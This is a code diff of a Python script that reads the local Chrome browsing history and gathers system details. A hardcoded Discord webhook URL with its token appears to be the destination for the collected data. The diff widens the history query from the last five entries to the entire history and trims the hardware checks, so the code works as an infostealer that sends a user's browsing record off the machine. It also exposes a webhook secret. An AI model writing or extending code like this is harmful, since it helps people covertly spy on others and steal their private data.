@@ -3,9 +3,6 @@ import os
 import platform
 import datetime
 import requests
-import psutil
-import gpuinfo
-import cpuinfo  # Import the cpuinfo library for CPU details
 
 # Discord webhook URL
 webhook_url = "https://discord.com/api/webhooks/1320743687109476393/03lSr_qHl0gJyrBWxBRg1uzLwTdwnWhp0p-mM-AWlaHxqn5bbL3ALjfVZUkiV01ReXee"
@@ -30,8 +27,8 @@ def get_chrome_history():
     conn = sqlite3.connect(chrome_history_path)
     cursor = conn.cursor()
 
-    # Query the browsing history (URLs and visit times)
-    cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5")
+    # Query all browsing history (URLs and visit times)
+    cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC")
     history = cursor.fetchall()
     conn.close()
 
@@ -57,20 +54,9 @@ def get_chrome_history():
 
     return formatted_history if formatted_history else "No browsing history found."
 
-# Function to gather PC system information
+# Function to gather basic PC system information
 def get_system_info():
     system_info = "**🖥️ System Information**\n\n"
-
-    # Get CPU info using py-cpuinfo
-    cpu_info = cpuinfo.get_cpu_info()
-    system_info += f"• **CPU:** {cpu_info['processor']}\n"
-
-    # Get GPU info
-    gpu_info = gpuinfo.get_info()
-    if gpu_info:
-        system_info += f"• **GPU:** {gpu_info[0].name}\n"
-    else:
-        system_info += "• **GPU:** Not detected\n"
 
     # Get basic PC info (OS, architecture, etc.)
     system_info += f"• **OS:** {platform.system()} {platform.release()}\n"
